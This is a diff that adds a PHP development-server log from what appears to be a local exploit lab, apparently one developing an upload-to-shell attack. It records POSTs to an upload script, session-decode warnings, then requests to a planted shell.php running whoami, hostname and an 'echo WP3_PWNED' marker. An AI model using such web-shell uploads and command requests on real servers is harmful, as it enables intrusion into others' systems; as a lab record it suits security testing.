@@ -1,0 +1,39 @@
+[Fri Oct 23 21:05:47 2026] PHP 8.1.34 Development Server (http://127.0.0.1:18802) started
+[Fri Oct 23 21:05:47 2026] 127.0.0.1:49680 Accepted
+[Fri Oct 23 21:05:47 2026] 127.0.0.1:49680 [200]: GET /up.php
+[Fri Oct 23 21:05:47 2026] 127.0.0.1:49680 Closing
+[Fri Oct 23 21:05:48 2026] 127.0.0.1:49681 Accepted
+[Fri Oct 23 21:05:48 2026] 127.0.0.1:49681 [200]: POST /up.php
+[Fri Oct 23 21:05:48 2026] 127.0.0.1:49681 Closing
+[Fri Oct 23 21:05:48 2026] 127.0.0.1:49682 Accepted
+[Fri Oct 23 21:05:48 2026] 127.0.0.1:49682 [200]: POST /up.php
+[Fri Oct 23 21:05:48 2026] 127.0.0.1:49682 Closing
+[Fri Oct 23 21:05:48 2026] 127.0.0.1:49683 Accepted
+[Fri Oct 23 21:05:48 2026] PHP Warning:  Unknown: Failed to decode session object. Session has been destroyed in Unknown on line 0
+[Fri Oct 23 21:05:48 2026] PHP Warning:  Unknown: Failed to write session data (files). Please verify that the current setting of session.save_path is correct (C:/Users/andre/Downloads/php2shell-claude/wp3/win_lab/8134/sess) in Unknown on line 0
+[Fri Oct 23 21:05:48 2026] PHP Warning:  Unknown: Session cookie cannot be sent after headers have already been sent in Unknown on line 0
+[Fri Oct 23 21:05:48 2026] PHP Warning:  Cannot modify header information - headers already sent in C:\Users\andre\Downloads\php2shell-claude\wp3\win_lab\8134\docroot\up.php on line 2
+[Fri Oct 23 21:05:48 2026] 127.0.0.1:49683 [200]: POST /up.php
+[Fri Oct 23 21:05:48 2026] 127.0.0.1:49683 Closing
+[Fri Oct 23 21:05:49 2026] 127.0.0.1:49684 Accepted
+[Fri Oct 23 21:05:50 2026] 127.0.0.1:49684 [200]: POST /up.php
+[Fri Oct 23 21:05:50 2026] 127.0.0.1:49684 Closing
+[Fri Oct 23 21:05:53 2026] 127.0.0.1:49685 Accepted
+[Fri Oct 23 21:05:53 2026] 127.0.0.1:49685 [200]: POST /up.php
+[Fri Oct 23 21:05:53 2026] 127.0.0.1:49685 Closing
+[Fri Oct 23 21:05:54 2026] PHP 8.1.34 Development Server (http://127.0.0.1:18804) started
+[Fri Oct 23 21:05:54 2026] 127.0.0.1:49686 Accepted
+[Fri Oct 23 21:05:54 2026] 127.0.0.1:49686 [200]: GET /up.php
+[Fri Oct 23 21:05:54 2026] 127.0.0.1:49686 Closing
+[Fri Oct 23 21:05:55 2026] 127.0.0.1:49687 Accepted
+[Fri Oct 23 21:05:55 2026] 127.0.0.1:49687 [200]: POST /up.php
+[Fri Oct 23 21:05:55 2026] 127.0.0.1:49687 Closing
+[Fri Oct 23 21:05:55 2026] 127.0.0.1:49688 Accepted
+[Fri Oct 23 21:05:55 2026] 127.0.0.1:49688 [200]: GET /shell.php?c=whoami
+[Fri Oct 23 21:05:55 2026] 127.0.0.1:49688 Closing
+[Fri Oct 23 21:05:55 2026] 127.0.0.1:49689 Accepted
+[Fri Oct 23 21:05:55 2026] 127.0.0.1:49689 [200]: GET /shell.php?c=echo%20WP3_PWNED
+[Fri Oct 23 21:05:55 2026] 127.0.0.1:49689 Closing
+[Fri Oct 23 21:05:55 2026] 127.0.0.1:49693 Accepted
+[Fri Oct 23 21:05:55 2026] 127.0.0.1:49693 [200]: GET /shell.php?c=hostname
+[Fri Oct 23 21:05:55 2026] 127.0.0.1:49693 Closing
